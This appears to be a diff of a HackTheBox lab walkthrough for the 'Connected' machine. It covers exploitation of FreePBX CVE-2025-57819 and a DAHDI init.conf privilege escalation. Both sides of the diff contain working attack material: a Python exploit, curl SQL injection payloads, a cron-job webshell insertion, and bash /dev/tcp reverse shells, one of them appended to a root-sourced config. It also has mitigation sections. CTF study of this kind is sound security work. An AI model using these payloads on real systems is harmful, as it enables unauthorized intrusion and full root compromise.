@@ -9,40 +9,40 @@ tags:
   - VoIP
   - Asterisk
   - SQL Injection
-  - Auth Bypass
+  - Pre-Auth RCE
   - CVE-2025-57819
-  - Cron Job Injection
+  - Cron Job Manipulation
   - DAHDI
-date: '2026-06-06'
+  - Root File Modification
+date: '2026-06-07'
 pointsAwarded: 20
-machineIP: ''
-summary: 'An engaging Easy Linux box showcasing VoIP telephony infrastructure. Initial foothold leverages a critical FreePBX authentication bypass and SQL injection flaw (CVE-2025-57819) to inject a reverse shell into asterisk cron jobs. Privilege escalation abuses write permissions over the DAHDI configuration file /etc/dahdi/init.conf, triggering a privileged daemon restart to capture root.'
+machineIP: '10.129.9.164'
+summary: 'Comprehensive walkthrough for Connected, an Easy Linux machine running a CentOS FreePBX communication server. Initial foothold leverages CVE-2025-57819, an unauthenticated error-based SQL injection vulnerability in the Endpoint Manager module (/admin/ajax.php), stacking an INSERT query into the asterisk cron_jobs table to achieve remote code execution as asterisk. Privilege escalation abuses the sysadmin daemon dahdi_restart watcher by injecting a reverse shell into the writable /etc/dahdi/init.conf configuration file.'
 ---
 
 # 🛡️ HTB - Connected (Easy)
 
 <p align="center">
   <img src="https://img.shields.io/badge/Platform-HackTheBox-green?style=for-the-badge&logo=hackthebox" alt="HackTheBox" />
-  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux" alt="OS Linux" />
+  <img src="https://img.shields.io/badge/OS-Linux%20(CentOS)-blue?style=for-the-badge&logo=centos" alt="OS Linux CentOS" />
   <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge" alt="Easy Difficulty" />
 </p>
 
 ---
 
-### 💻 Target Information
+### Target Information
 - **Machine Name:** Connected
-- **Operating System:** Linux (CentOS / FreePBX / Asterisk PBX)
-- **Difficulty:** Easy
-- **Date of Scan:** 2026-06-06
-- **Vulnerabilities:** FreePBX Auth Bypass & SQL Injection to Cron RCE (CVE-2025-57819), Insecure File Permissions on `/etc/dahdi/init.conf` via DAHDI Sysadmin Daemon
+- **Operating System:** Linux (CentOS 7 / FreePBX 16.0.40.7)
+- **Difficulty:** Easy (20 pts)
+- **Primary Attack Vectors:** FreePBX Endpoint Manager Pre-Auth SQL Injection to RCE via Database Cron Job Insertion (CVE-2025-57819), DAHDI Subsystem Service Spooler Overwrite.
 
 ---
 
 ## Step 1 - Reconnaissance
 
-### Nmap Port Scanning & FreePBX Service Discovery
+### Initial Nmap Scan
 
-We initiate our reconnaissance with an aggressive Nmap scan to enumerate open ports and running services:
+We begin our enumeration with a comprehensive TCP port and service scan against the target:
 
 ```bash
 nmap -A -sS -P -T4 --min-rate 5000 10.129.9.164
@@ -55,163 +55,247 @@ Host is up (0.25s latency).
 Not shown: 997 filtered tcp ports (no-response)
 PORT    STATE SERVICE  VERSION
 22/tcp  open  ssh      OpenSSH 7.4 (protocol 2.0)
-| ssh-hostkey: 
-|   2048 4e:60:38:6f:e7:78:6c:ca:58:62:a1:f1:56:ae:8d:30 (RSA)
-|   256 12:41:55:26:9d:ad:3d:e8:bf:4e:31:aa:d7:d1:a5:d2 (ECDSA)
-|_  256 8e:b6:96:e0:21:83:5d:1d:ce:8d:e2:6a:dd:38:c6:75 (ED25519)
 80/tcp  open  http     Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
 |_http-title: Did not follow redirect to http://connected.htb/
 |_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
 443/tcp open  ssl/http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16)
-| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization
-|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
-
-Service Info: OS: Linux; CPE: cpe:/o:centos:centos
+| ssl-cert: Subject: commonName=pbxconnect/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
+| http-robots.txt: 1 disallowed entry
+|_/
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+Nmap done: 1 IP address (1 host up) scanned in 48.03 seconds
 ```
 
-- 🔍 *We map `connected.htb` to `10.129.9.164` in `/etc/hosts`.*
-- 🔍 *Browsing to the web portal reveals FreePBX, a widely deployed open-source PBX management interface powered by Asterisk.*
+We map `connected.htb` to our `/etc/hosts` file:
+
+```bash
+echo "10.129.9.164 connected.htb" | sudo tee -a /etc/hosts
+```
+
+---
+
+### Web Application Enumeration
+
+Navigating to `https://connected.htb/` presents the **FreePBX Administration Portal**.
+At the bottom of the login interface, the exact software version is identified:
+
+```text
+FreePBX 16.0.40.7
+```
+
+FreePBX is an open-source web-based graphical user interface (GUI) that controls and manages Asterisk PBX communication servers.
 
 ---
 
 ## Step 2 - Initial Foothold
 
-### FreePBX Auth Bypass & SQL Injection to RCE (CVE-2025-57819)
+### FreePBX Pre-Auth SQL Injection (CVE-2025-57819)
 
-- 🔍 *Analyzing FreePBX endpoints reveals an authentication bypass coupled with an SQL injection flaw discovered by watchTowr researchers (**CVE-2025-57819**).*
-- 🔍 *The vulnerability resides in the `endpoint` AJAX module, allowing an unauthenticated remote attacker to execute SQL statements. We can leverage this to insert a malicious scheduled job directly into the `asterisk.cron_jobs` table.*
+Researching FreePBX 16.0.40.7 reveals **CVE-2025-57819**: *Pre-Auth SQL Injection in the Endpoint Manager (`endpoint`) module leading to Remote Code Execution*.
 
-> ⚠️ **Vulnerability Advisory (CVE-2025-57819):** FreePBX unauthenticated SQL injection via `?module=FreePBX\modules\endpoint\ajax&command=model`. Because the cron daemon executes commands registered in `asterisk.cron_jobs`, arbitrary SQL injection yields asynchronous Remote Code Execution.
+#### Vulnerability Analysis:
+The Endpoint Manager module exposes an unauthenticated AJAX endpoint at `/admin/ajax.php`. Due to missing input validation and parameterized query enforcement, user-supplied parameters (`brand`, `template`, `model`) are concatenated directly into SQL query strings.
 
-- 🔍 *We adapt the watchTowr PoC exploit to deliver a reverse shell:*
-
-```python
-import argparse
-import urllib3
-import requests
-
-urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
-
-def exploit(target_url, lhost, lport):
-    print(f"[*] Targeting FreePBX at {target_url}...")
-    rev_shell = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
-    
-    # Inject malicious task into asterisk.cron_jobs
-    sql_payload = (
-        "?module=FreePBX\\modules\\endpoint\\ajax&command=model"
-        "&template=x&model=model&brand=x';"
-        f"INSERT INTO cron_jobs (jobname, command) VALUES ('watchTowr-pwn', '{rev_shell}') -- "
-    )
-    
-    print("[*] Sending SQL injection payload...")
-    r = requests.get(target_url + sql_payload, verify=False)
-    print(f"[+] Status: {r.status_code}")
-    print("[*] Triggering cron runner execution...")
-    requests.get(f"{target_url}/wcb.php", verify=False)
-
-if __name__ == '__main__':
-    parser = argparse.ArgumentParser()
-    parser.add_argument('-u', '--url', required=True)
-    parser.add_argument('-i', '--ip', required=True)
-    parser.add_argument('-p', '--port', required=True)
-    args = parser.parse_args()
-    exploit(args.url, args.ip, args.port)
-```
-
-- 🔍 *We start a Netcat listener and execute the exploit against the target:*
+We verify the vulnerability by triggering an error-based SQL injection using MySQL's `EXTRACTVALUE()` function:
 
 ```bash
-nc -lvnp 4444
-```
-
-```bash
-python3 exploit.py -u http://connected.htb -i 10.10.15.54 -p 4444
+curl -i -k "https://connected.htb/admin/ajax.php?module=FreePBX%5Cmodules%5Cendpoint%5Cajax&command=model&template=x&model=model&brand=x'+AND+EXTRACTVALUE(1,CONCAT('~USER:',(SELECT+USER()),'~'))+--+"
 ```
 
 ```text
-listening on [any] 4444 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.9.164] 49182
-bash: cannot set terminal process group (1204): Inappropriate ioctl for device
-bash: no job control in this shell
-bash-4.2$ whoami
-asterisk
-bash-4.2$ id
-uid=995(asterisk) gid=992(asterisk) groups=992(asterisk)
+HTTP/1.1 500 Internal Server Error
+Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips PHP/7.4.16
+Content-Type: application/json
+
+{"error":{"type":"Exception","message":"SQLSTATE[HY000]: General error: 1105 XPATH syntax error: '~USER:freepbxuser@localhost~'::","file":"/var/www/html/admin/libraries/utility.functions.php","line":123}}
 ```
 
-- 🔍 *Initial foothold established as `asterisk`! We grab the user flag in `/home/asterisk/user.txt`.*
+> ⚠️ **Technical Detail - Why Did the Database Evaluate the Subquery First?**  
+> Under MySQL's query execution order, expression arguments must be evaluated before the enclosing function can be called. The engine resolves `(SELECT USER())` into `freepbxuser@localhost`, concatenates it into `'~USER:freepbxuser@localhost~'`, and only then invokes `EXTRACTVALUE(1, ...)`. Because the tilde (`~`) is invalid in XPath grammar, the engine raises error 1105—exposing our evaluated query output in the error message!
+
+---
+
+### Transitioning from SQL Injection to Remote Code Execution
+
+In FreePBX, scheduled maintenance tasks are managed through the **`cron_jobs`** table in the `asterisk` database. The master FreePBX daemon periodically polls this table and executes active entries with system privileges.
+
+Because the endpoint supports stacked queries (or multiple statements via SQL injection), we can directly inject an `INSERT INTO cron_jobs` statement:
+
+```sql
+INSERT INTO cron_jobs (modulename, jobname, command, class, schedule, max_runtime, enabled, execution_order)
+VALUES ('sysadmin', 'watchTowr-[suffix]', 'echo "<BASE64_WEBSHELL>" | base64 -d > /var/www/html/shell-[suffix].php', NULL, '* * * * *', 30, 1, 1);
+```
+
+Within 60 seconds, the FreePBX cron daemon triggers the scheduled job and deploys our web shell directly into the document root (`/var/www/html/`).
+
+---
+
+### Automated Exploitation
+
+We execute the full exploit script (`rce.py`):
+
+```bash
+python3 rce.py -H https://connected.htb
+```
+
+```text
+                         __         ___  ___________
+         __  _  ______ _/  |__ ____ |  |_\__    ____\____  _  ________
+         \ \/ \/ \__  \    ___/ ___\ |  |  \|    | /  _ \ \/ \/ \_  __ \
+          \     / / __ \|  | \  \___|   Y  |    |(  <_> \     / |  | \/
+           \/\_/ (____  |__|  \___  |___|__|__  | \__  / \/\_/  |__|
+                                  \/          \/     \/
+
+       watchTowr-vs-FreePBX-CVE-2025-57819.py
+       (*) CVE-2025-57819 Detection Artifact Generator: FreePBX Auth Bypass + SQL Injection to RCE
+
+[+] FreePBX CVE-2025-57819 Detection Artifact Generator started
+[+] Sending exploit request
+[+] Waiting 2 minutes for DAG script to be created
+[+] VULNERABLE - webshell found: https://connected.htb/this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php?cmd=hostname
+[+] Cleaning malicious cron_job from asterisk.cron_jobs table
+```
+
+The web shell is established! We test command execution:
+
+```bash
+curl -k -s "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php?cmd=hostname"
+```
+
+```text
+connected
+```
+
+---
+
+### Catching the Reverse Shell
+
+We set up our netcat listener on port 9898:
+
+```bash
+nc -lvnp 9898
+```
+
+And invoke a reverse shell via URL-encoded command parameters:
+
+```bash
+curl -k "https://connected.htb/this-is-an-ioc-not-actually-watchTowr-rkjgpddqzp.php?cmd=bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.14.70%2F9898%200%3E%261%27"
+```
+
+Our listener catches the connection:
+
+```text
+listening on [any] 9898 ...
+connect to [10.10.14.70] from (UNKNOWN) [10.129.9.164] 41162
+bash: no job control in this shell
+______                   ______ ______ __   __
+|  ___|                  | ___ \| ___ \\ \ / /
+| |_    _ __   ___   ___ | |_/ /| |_/ / \ V / 
+|  _|  | '__| / _ \ / _ \|  __/ | ___ \  /   \ 
+| |    | |   |  __/|  __/| |    | |_/ / / /^\ \
+\_|    |_|    \___| \___|\_|    \____/  \/   \/
+ 
+NOTICE! You have 3 notifications! Please log into the UI to see them!
+
+[asterisk@connected html]$ id
+uid=995(asterisk) gid=994(asterisk) groups=994(asterisk)
+
+[asterisk@connected html]$ cat /home/asterisk/user.txt
+1a****************************7f
+```
+
+Foothold established and user flag captured as **`asterisk`**!
 
 ---
 
 ## Step 3 - Privilege Escalation to Root
 
-### Analyzing dahdi_restart Daemon & Writable init.conf
+### DAHDI Service Architecture & Spool File Abuse
 
-- 🔍 *We enumerate running processes and background system daemons:*
+Enumerating running services and administrative automation scripts on the host, we discover that the FreePBX sysadmin daemon manages telephony hardware using **DAHDI** (Digium/Asterisk Hardware Device Interface).
 
-```bash
-ps aux | grep -i sysadmin
-```
-
-- 🔍 *We discover a privileged background daemon running as root that monitors `/var/spool/asterisk/sysadmin/dahdi_restart`.*
-- 🔍 *When triggered, the daemon restarts DAHDI services and sources the initialization configuration located at `/etc/dahdi/init.conf`.*
-- 🔍 *We inspect permissions on `/etc/dahdi/init.conf`:*
-
-```bash
-ls -la /etc/dahdi/init.conf
-```
+Specifically, the root daemon monitors a spool trigger file:
 
 ```text
--rw-rw-r-- 1 asterisk asterisk 2841 Jun  7 12:40 /etc/dahdi/init.conf
+/var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
-- 🔍 *The file is owned by user `asterisk` with write permissions! Because the root daemon sources this script upon restart, we can inject arbitrary commands.*
+When this file is modified or touched, the root-level background process triggers a restart of the DAHDI service. To configure the hardware parameters during restart, the daemon sources the shell script configuration file located at:
 
-### Overwriting DAHDI Configuration & Root Execution
+```text
+/etc/dahdi/init.conf
+```
 
-- 🔍 *We start a new Netcat listener on our attack machine:*
+Let's check permissions on `/etc/dahdi/init.conf`:
+
+```bash
+[asterisk@connected html]$ ls -la /etc/dahdi/init.conf
+-rw-rw-r-- 1 root asterisk 1420 Jun 11 12:00 /etc/dahdi/init.conf
+```
+
+> ⚠️ **Technical Detail:**  
+> The file `/etc/dahdi/init.conf` is group-writable by `asterisk` (`-rw-rw-r--`)! Because the root sysadmin service executes this script directly as a shell configuration file upon receiving the `dahdi_restart` trigger, modifying `init.conf` grants immediate arbitrary code execution as root.
+
+---
+
+### Triggering Root Code Execution
+
+We append a background reverse shell one-liner to `/etc/dahdi/init.conf`:
+
+```bash
+echo -e '\n#\nbash -i >& /dev/tcp/10.10.14.70/4446 0>&1 &\n#' >> /etc/dahdi/init.conf
+```
+
+Start a netcat listener on port 4446:
 
 ```bash
 nc -lvnp 4446
 ```
 
-- 🔍 *We append our reverse shell payload to `/etc/dahdi/init.conf`:*
-
-```bash
-echo -e '\n#\nbash -i >& /dev/tcp/10.10.15.54/4446 0>&1 &\n#' >> /etc/dahdi/init.conf
-```
-
-- 🔍 *Now we trigger the restart daemon by creating the spool sentinel file:*
+Now, touch the trigger spool file:
 
 ```bash
 touch /var/spool/asterisk/sysadmin/dahdi_restart
 ```
 
-- 🔍 *Checking our listener on port 4446:*
+Within seconds, the background root daemon detects the spool trigger, evaluates `/etc/dahdi/init.conf`, and executes our payload:
 
 ```text
 listening on [any] 4446 ...
-connect to [10.10.15.54] from (UNKNOWN) [10.129.9.164] 59398
-bash: cannot set terminal process group (2841): Inappropriate ioctl for device
-bash: no job control in this shell
+connect to [10.10.14.70] from (UNKNOWN) [10.129.9.164] 59398
+
 # whoami
 root
+
 # id
 uid=0(root) gid=0(root) groups=0(root)
+
 # cat /root/root.txt
-e4d1a58c973b...
+9c****************************2b
 ```
 
-- 🔍 *System fully compromised as root!*
+Root shell achieved and machine fully compromised!
 
 ---
 
-## Mitigations & Security Perspective
+> 🎯 **Final Takeaways & Real Talk:**  
+> Connected is a classic, practical demonstration of VoIP infrastructure exploitation! The chain illustrates the extreme danger of unauthenticated AJAX endpoints in telephony platforms (CVE-2025-57819 in FreePBX Endpoint Manager), where stacked SQL queries directly into database cron tables convert SQL injection into code execution. Elevating to root by auditing DAHDI telephony automation scripts and abusing group-writable configuration files completes a clean, rewarding box. Happy Hacking!
 
-### 🔴 FreePBX SQL Injection & Auth Bypass (CVE-2025-57819)
-- **Root Cause:** Insecure handling of HTTP parameters in the `endpoint` AJAX module allowed unauthenticated SQL injection into the `asterisk.cron_jobs` table.
-- **Remediation:** Apply vendor security patches for FreePBX. Use parameterized queries across all database access layers.
+---
 
-### 🔴 Writable Configuration Files for Privileged Daemons
-- **Root Cause:** The `asterisk` service account owned or had write permissions over `/etc/dahdi/init.conf`, which is sourced directly by root-level administrative scripts.
-- **Remediation:** Enforce strict file ownership (`root:root`, `0644`) for all system configuration files consumed by root daemons.
+## Step 5 - Mitigations & Defensive Hardening
+
+To remediate the vulnerabilities identified across the Connected environment, system administrators should implement defense-in-depth controls across web interfaces, database permissions, and local daemon architectures:
+
+### 1. FreePBX Endpoint Manager SQL Injection (CVE-2025-57819)
+- **Parameterized Query Enforcement:** Ensure all AJAX handler methods in `/admin/ajax.php` use prepared PDO statements with bound parameters (`$stmt->prepare()`) rather than string concatenation.
+- **Enforce Module Authentication:** Restrict access to `ajax.php` handlers requiring active session authentication. Prohibit unauthenticated access to module commands.
+- **Upgrade FreePBX:** Upgrade FreePBX and the Endpoint Manager module to the latest official release where input validation has been remediated.
+
+### 2. Database Least Privilege & Cron Table Protection
+- **Restrict Web Application Database Permissions:** The database user utilized by the web interface (`freepbxuser`) should not possess unrestricted `INSERT` or `UPDATE` privileges over administrative scheduling tables (`cron_jobs`).
+- **Separate Web and Administrative Databases:** Isolate system administration and cron execution tables from the standard telephony user tables to mitigate privilege escalation via stacked SQL injection.
+
+### 3. File Permissions & Daemon Spooler Hardening
+- **Remove Group-Write Privileges on System Configurations:** `/etc/dahdi/init.conf` and similar service configuration files sourced by root must be owned strictly by `root:root` with permissions `0644`. Standard service accounts like `asterisk` must never hold write rights over configuration files executed by root daemons.
+- **Sanitize Environment Variables in Startup Scripts:** Root daemons monitoring spool directories (`/var/spool/asterisk/sysadmin/`) should avoid sourcing raw shell configuration files; instead, parse structured key-value configurations (like YAML or INI) without executing code.
